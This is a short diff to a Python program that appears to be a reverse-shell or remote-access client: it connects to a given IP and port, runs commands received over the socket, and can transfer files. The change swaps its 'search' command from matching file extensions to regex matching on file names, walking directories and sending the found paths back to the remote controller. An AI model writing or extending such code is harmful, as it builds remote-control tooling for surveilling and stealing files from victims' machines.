@@ -2,7 +2,7 @@
 import socket 
 import subprocess
 import os
-
+import re
 
 def transfer(s,path):
     if os.path.exists(path):
@@ -51,11 +51,11 @@ def connect(ip,port):
                 
         elif 'search' in command.decode():
             command=command[7:]
-            path,ext=command.decode().split("*")
+            path,name=command.decode().split(" ")
             lists=''
             for dirpath,dirname,files in os.walk(path):
                 for file in files:
-                    if file.endswith(ext):
+                    if re.findall(name,file):
                         lists=lists+'\n'+os.path.join(dirpath,file)
             s.send(str(lists).encode())
 
